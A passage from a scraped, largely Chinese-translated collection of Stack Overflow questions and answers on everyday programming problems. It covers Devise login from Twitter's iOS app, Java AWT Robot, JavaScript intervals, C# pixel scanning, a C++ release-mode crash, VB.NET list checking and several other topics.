我正在开发的网站使用 Devise (https://github.com/plataformatec/devise/) 和 Omniauth (https://github.com/intridea/omniauth) 来允许用户通过 Twitter 登录。在浏览器中使用时效果很好。

这是重现问题的方法：

1.  用户正在使用 Twitter 的 IOS 应用程序
2.  用户点击嵌入在推文中的我们网站的链接
3.  Twitter 通过 UIWebView 打开我们的网站
4.  我们的网站要求用户通过 Twitter 登录
5.  应用程序执行 Safari 并重定向到 Twitter 的登录门户，提示用户登录
6.  当用户提交表单时，它会将他重定向回我们的站点并抛出错误：“会话已过期”

任何想法为什么会发生这种情况？或者任何人遇到同样的问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:39:49.853

我认为这没有任何变化，我在这里发布了这个问题，它有更多的互动[https://dev.twitter.com/discussions/9711](https://dev.twitter.com/discussions/9711)。

# java - Java Robot - Class functions issue

> ID：11751238
> 
> 赞同：0
> 
> 时间：2012-08-01T01:08:06.913
> 
> 标签：java, class, awt, awtrobot

I am trying to make a separate class for the Java AWT Robot to use with projects but i am having trouble setting it up how i would like as all of the examples I have found online seem to pack the code into a single .java file instead.

My code works fine however I am wondering if I could setup the functions in a nicer way.

The code for the RobotLib.java class is as follows:

```
package com.z;

import java.awt.*;
import java.awt.event.*;
import java.util.*;

    public class RobotLib {

    private static Robot robot;

    // Press Function
    public void Press(int key, int time){ 
        try {
        Robot robot = new Robot();
            robot.keyPress(key);
            robot.delay(time);
            robot.keyRelease(key);

        } catch (AWTException e) {
            e.printStackTrace();
        }
    } 

} 
```

And my Example.java code is:

```
package com.z;

import java.awt.*;
import java.awt.event.*;
import java.util.*;

public class Example {

    public static void main(String[] args) {

        RobotLib robot = new RobotLib();

        robot.Press(KeyEvent.VK_A,100); // type a

    }
} 
```

With the RobotLib.java class I was wondering if it's possible to have the functions without wrapping them with try/catch and new Robot() so instead of the above version it would be something like this instead:

```
public void Press(int key, int time){ 
    robot.keyPress(key);
    robot.delay(time);
    robot.keyRelease(key);
} 
```

The try/catch and new Robot() seem to be required however and if I take those away I get errors like this:

```
Exception in thread "main" java.lang.NullPointerException
    at com.z.RobotLib.Press(RobotLib.java:35)
    at com.z.Example.main(Example.java:14) 
```

I am quite new to Java coding and might be setting up the class the wrong way, is there a way to fix that error or have the functions how I want?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T01:18:08.163

Yes you do need the try/catch block in there, but yes there is also a way to set up those functions better. You don't need to create a robot each time you call the `Press` method. Create your static Robot instance in your constructor.

```
public class RobotLib {

private static Robot robot;

public RobotLib(){
  robot = new Robot();
}

// Press Function
public void Press(int key, int time){ 
    try {
        robot.keyPress(key);
        robot.delay(time);
        robot.keyRelease(key);

    } catch (AWTException e) {
        e.printStackTrace();
    }
} 

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-09-30T14:34:42.153

Don't quite sure of your questions but I hope this might help!

You can throws an exception to avoid unnecessary try and catch blocks. Also, creating an instance of class Robot will make you avoid writing new Robot() at everyline you are in need of it.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:08:46.697

I just found a way to do what i wanted using a modified version of the code Raskolnikov posted, it allows shorter versions of the function like i wanted:

```
public class RobotLib {

private static Robot robot;

public RobotLib(){
  try {
    robot = new Robot();
} catch (AWTException e) {
    e.printStackTrace();
}
}

// Press Function
public void Press(int key, int time){ 
    robot.keyPress(key);
    robot.delay(time);
    robot.keyRelease(key);
} 

} 
```

# asp.net-mvc-4 - 尝试在 AppHarbor 上查看我的 MVC4 应用程序时出现 403 错误（禁止）

> ID：11751240
> 
> 赞同：2
> 
> 时间：2012-08-01T01:08:26.023
> 
> 标签：asp.net-mvc-4, visual-studio-2012, http-status-code-403, appharbor

我是 ASP.net 和 AppHarbor 的新手。我以前也从未部署过 ASP.net 应用程序。

我已经使用 Visual Studio 2012 候选版本建立了一个 MVC4 网站，它已接近完成。在本地，它工作正常/如预期的那样。

为了向客户发送当前进度演示，有人建议我应该使用[AppHarbor](https://appharbor.com)来托管应用程序/网站。

我已经完成了设置 Git 存储库并将其与 AppHarbor 连接的过程。然后，我使用`Build -> Publish Selection`Visual Studio 中的选项在存储库的本地副本中创建“Web 部署包”。最后，我将创建的文件（如下所示）推送到存储库，AppHarbor 将提交列为“活动”。

  ![在此处输入图像描述](../Images/f7076e265899b134801218936424bbc8.png)

> 然而，当我点击*Go to your application*时，我得到的只是[这个华丽的 403 页面](http://barslide.apphb.com/)。

我已经尝试了一堆我在论坛中看到的东西（到目前为止都没有奏效）（包括这里和 AppHarbor 支持），包括：

*   [添加一个`<modules runAllManagedModulesForAllRequests="true"/>`](https://stackoverflow.com/questions/11425574/mvc4-http-error-403-14-forbidden)
*   [确保我没有多个网络项目](https://stackoverflow.com/questions/7954765/appharbor-nopcommerce-running-issue)。
*   检查并确认 AppHarbor 中没有列出任何错误。
*   我已经关闭了[CustomErrors](http://msdn.microsoft.com/en-us/library/h0hfz6fc.aspx)，没有产生任何差异。

自从我开始这个项目以来，我没有接触过任何`.config`东西（因为我还不知道如何使用它们）。也许我只是没有在其中添加一些明显的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T05:47:02.683

当你想部署到 AppHarbor 时，你不应该使用 Web Publish 的东西。AppHarbor 直接获取您的源代码、构建它、测试它并部署它。

这是[使用 Git 在 AppHarbor 上部署您的第一个应用程序](http://support.appharbor.com/kb/getting-started/deploying-your-first-application-using-git)的指南。AppHarbor 首页上还有一段视频，您可以查看。

# javascript - clearInterval 不停止过去 0（倒计时）

> ID：11751250
> 
> 赞同：2
> 
> 时间：2012-08-01T01:10:14.977
> 
> 标签：javascript, setinterval, clearinterval

这只是我正在使用的一个简单的 setInterval 示例，但 clearInterval 并没有停止 setInterval。它计算通过 0 到负数。我如何使这项工作并在 0 处停止？

```
 getMoreVideosCountdown = 10;
    getMoreVideos = setInterval(function() {
        console.log(getMoreVideosCountdown);
        if (getMoreVideos <= 0) {
            clearInterval(getMoreVideos);
        }
        getMoreVideosCountdown--;
    },1000); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:12:42.740

```
if (getMoreVideos <= 0) { 
```

应该

```
if (getMoreVideosCountdown <= 0) { 
```

* * *

目前，您正在检查是否`interval identifier`会降低或等于零，这永远不会发生。

# c# - 如何找到黑色像素位置

> ID：11751255
> 
> 赞同：5
> 
> 时间：2012-08-01T01:11:06.100
> 
> 标签：c#, c++, colors, coordinates, pixels

我正在做一个奇怪的项目。我可以使用我用来制作模板（金属）的激光切割机。我可以使用坐标对机器进行编程以切割特定图像，但我想知道的是：我怎样才能**编写一个程序来获取黑白扫描图像，并给我黑色区域的坐标**？我不介意它是否给出了每个像素，即使我只需要外线，我也可以做到这一点。

我已经搜索了一段时间，但是这个问题有很多单词和很多结果，比如颜色和像素，我发现了大量不相关的信息。我想使用 C++ 或 C#，但我可以使用任何语言，包括脚本。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:26:54.793

我用[`GetPixel`](http://msdn.microsoft.com/en-us/library/system.drawing.bitmap.getpixel.aspx)在`C#`：

```
public List<String> GetBlackDots()
{
    Color pixelColor;
    var list = new st<String>();
    for (int y = 0; y < bitmapImage.Height; y++)
    {
        for (int x = 0; x < bitmapImage.Width; x++)
        {
            pixelColor = bitmapImage.GetPixel(x, y);
            if (pixelColor.R == 0 && pixelColor.G == 0 && pixelColor.B == 0)
                list.Add(String.Format("x:{0} y:{1}", x, y));
        }
    }
    return list;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-01T01:22:22.350

如果我们假设扫描的图像是完美的白色和完美的黑色，没有中间颜色，那么我们可以将图像作为 rgb 值的数组并简单地扫描 0 值。如果值为0，它一定是黑色的吧？但是，图像可能不会完全是黑色的，因此您需要一些回旋余地。

然后你所做的看起来像这样：

```
 for(int i = 0; i < img.width; i++){
       for(int j = 0; j < img.height; j++){
          // 20 is an arbitrary value and subject to your opinion and need.
          if(img[i][j].color <= 20)
             //store i and j, those are your pixel location
       }
     } 
```

现在，如果您使用 C#，将很容易导入大多数图像格式，将 em 粘贴到数组中并获得结果。但是，如果您想要更快的结果，那么使用 C++ 会更好。

这个快捷方式完全依赖于非常极端的图像值。如果您的图像的大部分区域真的是灰色的，那么这种方法的准确性很糟糕。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T01:22:02.347

虽然有多种语言的许多解决方案，但我将概述一个我自己可能会使用的简单解决方案。有一个用于 Python 的强大的成像库，称为 PIL（Python Imaging Library - [http://www.pythonware.com/products/pil/](http://www.pythonware.com/products/pil/)），它可以很容易地完成您需要的工作。

这是一个可以帮助您入门的示例。

```
image = Image.open("image.png")
datas = image.getdata()

for item in datas:
    if item[0] < 255 and item[1] < 255 and item[2] < 255 :
        // THIS PIXEL IS NOT WHITE 
```

当然，这将计算任何不完全白色的像素，您可能需要添加一些填充，以便不完全白色的像素也被拾取为白色。您还必须跟踪您当前正在查看的像素。

# glassfish-3 - Glassfish 节点聚类

> ID：11751258
> 
> 赞同：0
> 
> 时间：2012-08-01T01:11:22.353
> 
> 标签：glassfish-3

对不起先生，我有一个研究项目，在不同的服务器上集群 glassfish3。我的简单实现是：

当您在不同的服务器上有 2 个 Glassfish 服务器时，称为服务器 A 和服务器 B。

当服务器 A 上的 glassfish 突然关闭或关闭时，它会对服务器 B 上的 Glassfish 进行“故障转移”，并且会话不会丢失或更改？

我已经尝试从链接[JavaDUDE](http://javadude.wordpress.com/2011/05/12/glassfish-3-1-%E2%80%93-clustering-tutorial-part2-sessions/)进行 glassfish 会话集群。但它只适用于 glassfish 服务器的 1 个实例，知道吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T00:49:24.507

您是否使用 web 应用程序来测试故障转移？如果是这样，您是否使其可分发？（详情请查看：[http](http://docs.oracle.com/cd/E18930_01/html/821-2426/abdle.html#scrolltoc) ://docs.oracle.com/cd/E18930_01/html/821-2426/abdle.html#scrolltoc ）

# android - Android使跨度包含在Toast中可点击的链接

> ID：11751260
> 
> 赞同：0
> 
> 时间：2012-08-01T01:11:45.037
> 
> 标签：android, html, toast, clickable

通过网络服务，我收到一条包含链接的错误消息（例如

```
Click <a href='blablabla'>here</a> 
```

）。我使用 fromHtml 将其转换为 spanned，然后在自定义 Toast 中显示。在 toast 中显示文本，并且“此处”带有下划线，就像链接一样。但是，当我单击它时，它什么也没做。

我应该如何解决这个问题？有没有办法从xml中扣除链接（例如

```
<ERROR>Click &lt;a href='blabla'&gt;here&lt;/a&gt;</ERROR> 
```

) 所以我可以创建一个按钮来推动它在 Webview 中打开链接？

这是相关代码：我的主要活动

```
CommonCode.showToast(error, mContext, mViewGroup, true); 
```

通用代码

```
public static void showToast(Spanned toastString, Context context, View view, Boolean isLink) {
    LayoutInflater inflater = LayoutInflater.from(context);
    View layout = inflater.inflate(R.layout.toast_layout, (ViewGroup) view);

    TextView text = (TextView) layout.findViewById(R.id.toastText);
    if(isLink == true) {
        text.setMovementMethod(LinkMovementMethod.getInstance());
    }

    text.setText(toastString);

    Toast toast = new Toast(context);
    toast.setGravity(Gravity.CENTER_VERTICAL, 0, 0);
    toast.setDuration(Toast.LENGTH_LONG);
    toast.setView(layout);
    toast.show(); 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-06T09:59:47.140

Toast 的设计目的是在短时间内向用户展示少量信息。如果您需要按下按钮，请尝试使用对话框而不是吐司。

# c# - NetSpell 拼写检查器

> ID：11751263
> 
> 赞同：3
> 
> 时间：2012-08-01T01:12:40.137
> 
> 标签：c#, spell-checking

有人试过[这个库](http://www.codeproject.com/Articles/5277/NetSpell-Spell-Checker-for-NET)吗？我无法让它工作。例如，拼写建议应该如下工作。

但我得到了一个空列表。我首先得到一个例外说

> C:\Program Files (x86)\Common Files\microsoft shared\DevServer\10.0\en-us.dic

不见了，所以我从网上下载了它。我得到的文件有数千个英文单词的列表，我什至尝试了文件中的单词，但仍然没有运气。

他是我试过的一些代码。

```
Spelling s = new Spelling();
ArrayList items;
s.MaxSuggestions = 5;
s.SuggestionMode = Spelling.SuggestionEnum.PhoneticNearMiss;
s.Suggest(str);
items = s.Suggestions;
s.SuggestionMode = Spelling.SuggestionEnum.NearMiss;
s.Suggest(str);
items = s.Suggestions;
s.SuggestionMode = Spelling.SuggestionEnum.Phonetic;
s.Suggest(str);
items = s.Suggestions; 
```

Suggest 方法应该获取“str”的建议并填充 Suggestions 属性。我总是收到 0 条建议。我尝试了库支持的所有三种建议类型，以查看它是否可以执行您所看到的任何操作，但这也不起作用。

即使是简单的调用，例如

```
s.TestWord("book") 
```

还给“假”。我认为它无法使用字典文件，但不确定还能做什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T18:26:34.653

就是这样，dic文件不兼容。我刚刚使用了下载 NetSpell 时附带的那个，它就像一个魅力。

顺便说一句，我改用 NHunspell，我比 NetSpell 更喜欢它。更容易使用和更好的建议。 [http://www.crawler-lib.net/nhunspell](http://www.crawler-lib.net/nhunspell)

# c++ - 稳定符号的 this 指针为 NULL

> ID：11751265
> 
> 赞同：0
> 
> 时间：2012-08-01T01:12:47.357
> 
> 标签：c++, visual-studio, static, release

环境：
visual studio 2008 sp1(c++)
windows 7 sp1 x64
win32 api + directx游戏项目

问题 ：

```
//superclass of every variables.
//METHOD has automatically type-cast to int, float, string.
//and array function.
//this class series is using from script interpreter system.
class METHOD {  // it is superclass of everything
friend class INTERPRETER;

protected:
BOOL constant;
//for variables & Functions
//TCHAR* m_name;
std::wstring m_name;

KEYWORD m_key;
RESERVED m_res;

int int_result;
std::wstring str_result;
float float_result;
TYPE m_type;

int m_level;

//tree
METHOD* root_ofme;
METHOD* sibling;
METHOD* left;
METHOD* right;
METHOD* parent;

//for FOR & BREAK class
//METHOD* m_targetToBreak;
BOOL m_breakingNow;

int m_rank; //priority

private:

public:
//constant
void EnableConstant(BOOL bcon);
void EnableConstant();
BOOL isConst();
//setter event
std::vector<METHOD*>* m_triggerTable;
std::vector<std::vector<METHOD*>*>* m_triggerArgs;

virtual void RunTrigger();
virtual void setTrigger(METHOD* mt, std::vector<METHOD*>* pVecArg);
virtual void removeTrigger(METHOD* mt);

//mapset
VMAP& GetVMap() const;
VMAP::iterator& MyMapItr() const;
BOOL HasVMap() const;
int GetArraySize() const;
private:
VMAP* m_map;
VMAP::iterator* m_my_itr;
public:
VARIABLE* m_zero;
virtual BOOL isZeroExternal();
BOOL m_ExternalZero;
int GetMethodIndex();
METHOD* GetSearchArray(int range);

METHOD* m_myParentFunc;
virtual METHOD* getParentFunc();

METHOD* m_OverParams;
virtual BOOL isOverflowParam();
BOOL m_bIsOverflowParam;

virtual METHOD* getOverParam();

METHOD* v;  //node pointer : using it to pointing other METHOD class

virtual KEYWORD getMyOwnKey();
virtual RESERVED getMyOwnRes();
virtual METHOD* getMyOwnRight();
virtual METHOD* getMyOwnLeft();
virtual METHOD* getMyOwnParent();

virtual METHOD* getParentArray();
METHOD* m_mtBodyTrue;

//For Operations
virtual int getOperationRank();

//Label & goto
virtual void setValid();
//virtual BOOL getVaild();
virtual BOOL getValid();
virtual size_t getTargetToJump();
virtual void setTargetToJump(size_t setvalue);

virtual KEYWORD getKey();
virtual RESERVED getRes();

//virtual void Operation();

//for brace
virtual void SetOpenner();
virtual void SetCloser();
virtual BOOL IsOpenner();
virtual void SetCounter(size_t);
virtual size_t GetCounter();

//for Callfunc
virtual void setFunc(METHOD* func);
virtual METHOD* getFunc();
virtual void push_back_arg(METHOD* mt);

//For Reserved, Functions & Variables
//variables
virtual void Run_PostOrder();
virtual void Run_InOrder();
virtual void Operation(std::vector<METHOD*>* arg_arglist);
virtual void Operation();

//virtual void FuncOperation(METHOD* pf, void* arg_arglist=NULL);
virtual int getsize();
virtual int getsize(int arraynum);

//for Array Support Version virtuals
virtual METHOD* getArray(int arraynum);
virtual METHOD* searchArray(int arraynum);
virtual void clearArray();
virtual void CopyTotalArrayTo(METHOD* varDest) const;
virtual void CopyTotalArrayFrom(const METHOD* varSrc);
private:
static void CopyArray(VMAP* destMap, const VMAP* srcMap);
public:
virtual size_t getNumArray();

//get//////////////////////////////////////////////////////////////////////////
virtual int getInt() const;
virtual std::wstring getStr() const;
virtual float getFloat() const;
virtual int getINT();
virtual std::wstring getSTR();
virtual float getFLOAT();
virtual METHOD* getMethod() const;
//7 get

virtual int getInt(int arraynum);
virtual std::wstring getStr(int arraynum);
virtual float getFloat(int arraynum);
virtual int getINT(int arraynum);
virtual std::wstring getSTR(int arraynum);
virtual float getFLOAT(int arraynum);
virtual METHOD* getMethod(int arraynum);
//7 array-get
//14 gets
//////////////////////////////////////////////////////////////////////////

//type//////////////////////////////////////////////////////////////////////////
virtual TYPE type() const;
virtual TYPE typeCast(TYPE totype);
//2 type

virtual TYPE type(int arraynum);
virtual TYPE typeCast(int arraynum, TYPE totype);
//2 array-type
//4 types
//////////////////////////////////////////////////////////////////////////

//set//////////////////////////////////////////////////////////////////////////
//non-array set
virtual void set(const METHOD* var);
virtual void set(const int k);
virtual void set(TCHAR* start, TCHAR* end);
virtual void set(std::wstring& start, int size);
virtual void set(const std::wstring& target);
virtual void set(const float f);
//6 set
virtual void set(int arraynum, const METHOD* var);
virtual void set(int arraynum, const int k);
virtual void set(int arraynum, TCHAR* start, TCHAR* end);
virtual void set(int arraynum, std::wstring& start, int size);
virtual void set(int arraynum, const std::wstring& target);
virtual void set(int arraynum, const float f);
//6 array-set
//12 sets

//////////////////////////////////////////////////////////////////////////

//for Variable & Functions
//virtual void setName(TCHAR* name, size_t size);   //삭제됨
virtual void setName(TCHAR* name);
virtual void setName(WORDCLIPPER* wc);
virtual void setName(const std::wstring& name);
virtual const std::wstring& getName() const;
virtual int getArgnum();
virtual int getNumParam();
virtual TYPE getArgTYPE(int i);

//for FOR & BREAK class
virtual BOOL isFOR();
virtual void Break();
virtual void Enter();
virtual void Leave();
virtual BOOL State();

//FOR TREES
//root setting
virtual void RootSet(METHOD* mt);
virtual METHOD* RootGet();
virtual void SetParent(METHOD* mt);
virtual void SetLeft(METHOD* mt);
virtual void SetRight(METHOD* mt);
virtual METHOD* GetParent();
virtual METHOD* getLeft();
virtual METHOD* getRight();

//for everythings
virtual int getLevel();
virtual int setLevel(int lv);
METHOD();
~METHOD();
METHOD(const METHOD&);

//addinational basic ctor
METHOD(const std::wstring& name, const std::wstring& strVal);
METHOD(const std::wstring& name, const int intVal);
METHOD(const std::wstring& name, const float floatVal);
//111213
METHOD(const std::wstring& strVal);
METHOD(const int intVal);
METHOD(const float floatVal);
//111213
METHOD operator + (const METHOD& addend) const;
METHOD operator - (const METHOD& addend) const;
METHOD operator * (const METHOD& divisor) const;
METHOD operator / (const METHOD& divisor) const;
METHOD operator % (const METHOD& divisor) const;
METHOD& operator += (const METHOD& addend);
METHOD& operator -= (const METHOD& addend);
METHOD& operator *= (const METHOD& divisor);
METHOD& operator /= (const METHOD& divisor);
METHOD& operator %= (const METHOD& divisor);
BOOL operator == (const METHOD& comptarget) const;
BOOL operator != (const METHOD& comptarget) const;
operator unsigned int() const;
operator int() const;
operator float() const;
operator std::wstring() const;
operator bool() const;
operator unsigned long() const;
operator long() const;

private:
//111213 compare
static BOOL compare_totalArray(const METHOD* first, const METHOD* second, BOOL ignoreCase_string_compare,BOOL ignore_type_difference);
static BOOL compare_single(const METHOD* first, const METHOD* second, BOOL ignoreCase_string_compare,BOOL ignore_type_difference);

void CopySingleMethodFrom_NotCast(const METHOD* from);

//only called once
void First_Initializer();

};

//this is POWER operator class.
class POWER : public METHOD {
public:
virtual void Operation();  //doing POW operation using left-child node(METHOD*) and right-child node(METHOD*). the result is saved to this class's result.
const static KEYWORD key = Key_Caret;
POWER();
~POWER();
};

//and using it in static function

//making terrain function. it decide terrain's size using parameter 2^szTile+1, 2^TileNum, 2^TilePackNum
HRESULT SETTERRAINTOTAL::SetTerrainTotal( int szTile, int TileNum, int TilePackNum, size_t Scene /*= -1*/, int resource_id /*= -1*/ )
{
#define RATION_MODE
#ifdef RATION_MODE  

if(Scene == -1) Scene = vgp->GetCurrentSceneNumber();
VLogicPackage* vl = vgp->GetScene(Scene);
if(!vl) return E_FAIL;

POWER RatioTileSize; //A
RatioTileSize.SetLeft(&VARIABLE(2));
RatioTileSize.SetRight(&VARIABLE(szTile));
RatioTileSize.Operation();

POWER RatioNumTile; //B
RatioNumTile.SetLeft(&VARIABLE(2));
RatioNumTile.SetRight(&VARIABLE(TileNum));
RatioNumTile.Operation();

POWER RatioTilePack; //C
RatioTilePack.SetLeft(&VARIABLE(2));
RatioTilePack.SetRight(&VARIABLE(TilePackNum));
RatioTilePack.Operation();

if(FAILED(vl->SetTerrainTotal(
    RatioTileSize+VARIABLE(1),
    RatioNumTile,
    RatioTilePack,
    resource_id)))
    return E_FAIL;
#else
if(FAILED(vl->SetTerrainTotal(
    TileSize,
    NumTile     ,
    NumTilePack ,
    resource_id)))
    return E_FAIL;
#endif
return S_OK;
} 
```

问题仅发生在 A、B、C 点发布模式。
当我在发布模式下使用调试器进行跟踪时，在 A、B、C 点的 METHOD() 函数中，调用 void First_Initializer() 后，每个 POWER 类的“this”指针为 0x00000000（NULL）。我不能自信，因为发布模式，但它实际上会出现问题。（并且“调试模式”没有问题）
当创建者结束并继续逐步Visual Studio调试器时，POWER类的堆栈实例的虚函数表为NULL

我挖掘了它，并且知道了一些事情：这个问题只发生在“静态函数”和“堆栈符号（例如，没有堆符号，使用新的......）”中。
但我不知道为什么会出现这个问题。

我向你道歉我糟糕的英语和很长的源代码。（但我会尽力而为...我尝试将源代码缩短...）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:21:40.040

显然它并没有你想象的那么稳定。;)

堆腐败？尝试动态检查器`valgrind`，如 Electric Fence，或`Purify`发现问题。如果没有这些，请使用您的调试器来捕捉行为中的保护/分段错误。如果故障很容易重现并且在相同的情况下发生，您应该能够平分问题域，从故障向后工作。

* * *

作为一个完全不请自来的评论 - 命名事物非常重要（并且经常被低估）并且将术语`METHOD`作为实际课程重载是一个完全令人兴奋的事情。如果您想要极其动态的编程，C++ 可能不是正确的解决方案。此外，拥有一个具有大量方法或成员的类有时表明它可能可以更好地分解。

# qt - QML Row如何从右边过渡项目？

> ID：11751266
> 
> 赞同：2
> 
> 时间：2012-08-01T01:12:51.203
> 
> 标签：qt, qml

所以我有一个连接到模型和委托的行，当一个新项目附加到我想从右边动画它的行时。如果新项目的宽度为“58”，则此方法有效：

```
Row {
    id: myRow
    add: Transition {
        NumberAnimation {
            properties: "x"
            from: width + 58
            easing.type: Easing.OutBounce
            duration: 1000
        }
    }

    Repeater {
        model: myModel
        delegate: myDelegate
    }
} 
```

如何将该宽度设置为要添加的项目的宽度，而不是对其进行硬编码？

# matrix - 在 Maxima (wx) 中操作矩阵

> ID：11751277
> 
> 赞同：1
> 
> 时间：2012-08-01T01:14:37.263
> 
> 标签：matrix, maxima

我想在 wxMaxima 中做一些简单的矩阵操作。我面临的问题是，Maxima 总是根据矩阵的各个元素提供答案。这是一个例子：

我想扩展 (A+B)(A+B)`，其中 A 和 B 是 2x2 矩阵。然后我想看看输出：

AA`+AB`+BA`+BB`,

但我得到的是一个像这样的矩阵：

[(b2+a2)^2+(b1+a1)^2 .......]

[.................................. .......] （我刚刚放了点而不是输入所有元素）

那么有没有办法强制千里马在不查看矩阵内部元素的情况下操纵矩阵？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-18T22:17:36.790

如果你不填写矩阵，只是将它们声明为非标量，你可以得到你想要的：

```
(%i1) declare([A,B], nonscalar)$
      (A+B) . transpose(A+B);
      %, expand;

(%o2) (B+A) . (transpose(B)+transpose(A))
(%o3) B . transpose(B)+B . transpose(A)+A . transpose(B)+A . transpose(A) 
```

# .net - CheckListBox - 根据数组值检查项目 - VB.NET

> ID：11751279
> 
> 赞同：0
> 
> 时间：2012-08-01T01:14:42.450
> 
> 标签：.net, mysql, vb.net, checklistbox

好的...经过很多天的尝试，我别无选择，只能寻求帮助。我用谷歌搜索了我的小心脏，现在它把我带到了这里。请帮忙。

我从我的 MySQL 数据库服务器得到一个字符串。然后我拆分字符串并将其放入一个数组中。

比我检查我的复选框并查看其中的任何条目是否等于数组值。问题是，它不起作用，对于我的生活，我无法让它起作用。

这有点像我拥有的​​模板，如果有人可以帮助我解决这个问题，我将不胜感激。

```
 Using connection As New MySqlConnection("datasource = " + IPADDRESS + "; username = '" + USERNAME + "'; password='" + PASSWORD + "' ; database = '" + DBASE + "'")
        Using Command As New MySqlCommand("SELECT * FROM hazinc WHERE title = '" + ListBox1.Text + "'", connection)

            connection.Open()

            'Command.ExecuteReader()
            Using reader As MySqlDataReader = Command.ExecuteReader()
                While reader.Read()
                    'TextBox2.Text = reader("title")
                    STRINGRR = reader("involved")

                End While

                Dim NEWSTRINGRR As String() = STRINGRR.Split(",")

                Dim CC As Integer

                CC = 0

                For Each X In NEWSTRINGRR
                    For I = 0 To clbEmployees.Items.Count - 1
                        Try
                            If clbEmployees.Items(I).ToString() = NEWSTRINGRR(I).ToString() Then
                                SetItemChecked(I)
                            End If
                        Catch ex As Exception
                            ' MsgBox(ex.ToString)
                        End Try

                    Next
                Next

            End Using

            connection.Close()

        End Using
    End Using 
```

任何人？请...？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T02:11:34.090

我不确定用这么少的代码，但为什么你的 If 条件使用相同的索引？那么 X 有什么用呢？

我认为应该是这样的：

```
For Each X In NEWSTRINGRR
    For I = 0 To clbEmployees.Items.Count - 1
        If clbEmployees.Items(I).ToString() = X.ToString() Then
           SetItemChecked(I)
        End If
    Next
Next 
```

CMIIW。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T01:55:08.277

你知道 STRINGRR 只会有最后一行的值。添加是，您需要发布所有代码。

# ios - 如何增加数组中的数字以填充 UIPickerView

> ID：11751280
> 
> 赞同：1
> 
> 时间：2012-08-01T01:14:57.003
> 
> 标签：ios, xcode, nsarray, uipickerview, increment

我有一个用数组填充的 UIPickerView。它有两列，我需要第一列从 50 到 500。第二列从 0.01 变为 1。重点是让用户选择他们的体重。为了做 50-500 我有这个，

```
-(void)populateWeightPickerArray{
weightPickerArray = [[NSMutableArray alloc] init];
for (int weight = 50; weight <=500; weight++) {
    NSString *weightString = [NSString stringWithFormat:@"%d%",weight];
    [weightPickerArray addObject:weightString];
}
} 
```

我尝试用小数来做，但是当我使用 ++ 时，它会增加整数，我最终得到 1.01、2.01、3.01 等。这就是我的代码。

```
-(void)populateWeightPickerArray2{
weightPickerArray2 = [[NSMutableArray alloc] init];
for (float weightDecimal = .01; weightDecimal <= 10; weightDecimal++) {
    NSString *weightDecimalString = [NSString stringWithFormat:@"%0.2f",weightDecimal];
    [weightPickerArray2 addObject:weightDecimalString];
}   
} 
```

（我知道我说我只需要它去 1 而不是 10，但我放了 10，因为一开始它只显示 1.01，所以我放 10 来测试输出，直到我能把它弄好。）

所以我需要以某种方式增加它以使其从 0.01 变为 1（0.02、0.03、0.04 等）。有人知道怎么做吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:21:21.943

```
for (float weightDecimal = .01; weightDecimal <= 10; weightDecimal = weightDecimal + 0.01) 
```

或更简洁地说：

```
for (float weightDecimal = .01; weightDecimal <= 10; weightDecimal += 0.01) 
```

在 Objective C 中：`x += y`是`x = x + y`.

尽管您经常看到带有or`for`的循环，但您可以使用任何表达式。`something++``something--`

# php - 当程序仍在运行时，如何在 PHP 中重新加载文件？

> ID：11751289
> 
> 赞同：1
> 
> 时间：2012-08-01T01:16:16.060
> 
> 标签：php, bots, irc

我正在帮助开发一个 PHP IRC 机器人，我想知道如何通过 IRC 命令重新加载机器人的配置。有人可以给出一种关于如何完成这项任务的基本想法吗？我在想也许机器人可以 re-require_once 配置文件然后重新启动，但我不知道该怎么做（当它运行 die() 时，它会停止整个程序，因此它无法自行恢复。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T01:32:44.110

您的 PHP 程序可能是基于事件的。你将在一个端口上监听。你的代码中有一个点，每当有人在频道中写东西时都会调用它。

此时，您可以注入从磁盘加载配置的逻辑。

您还可以围绕此逻辑使用一个包装器，用作基于时间的缓存：它不会在每次发布帖子时重新加载配置 - 而是在内存中查找它。

# java - 从Java方法返回后如何访问返回数据

> ID：11751290
> 
> 赞同：0
> 
> 时间：2012-08-01T01:16:32.613
> 
> 标签：java, methods, return-value

> 我是 Java 新手，这是一个真正的基本问题，所以请不要错过森林之树。我只需要知道如何访问从该方法返回的数据

```
 private static int toInt( String number )
    {
        int multiplicand = 0;
        // do stuff to figure out a multiplicand
        return multiplicand;
    }

    public static void main( String[ ] args )
    {
        int anotherVariable = 53;
        toInt( args[ 0 ] ); 
```

> 那么，在我从 toInt 方法返回以访问被乘数中的内容后，我在这里说什么？
> 假设我想乘以 multiplicand * anotherVariable 中返回的值。我不能使用 multiplicand，因为编辑器只是说“无法将 multiplcand 解析为变量”。
> 
> 提前感谢所有有耐心容忍我们新手的伟大程序员。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T01:18:59.700

您将函数调用的结果分配给一个变量，然后使用它。

`int result = toInt ("1");`

您现在可以随意使用`result`；它包含您在方法中返回的任何内容，即`multiplicand`. 所以在你的情况下，你现在可以做

`int anotherResult = result * anotehrVariable;`

注意你也可以这样做

`int anotherResult = toInt(args[0]) * anotherVariable;`

没有将调用的结果分配给`toInt`中间变量。

我更喜欢将函数调用分配给变量；使调试更容易。如果您想多次使用结果，使用变量几乎总是更好。

# javascript - 相对于页面定位元素

> ID：11751293
> 
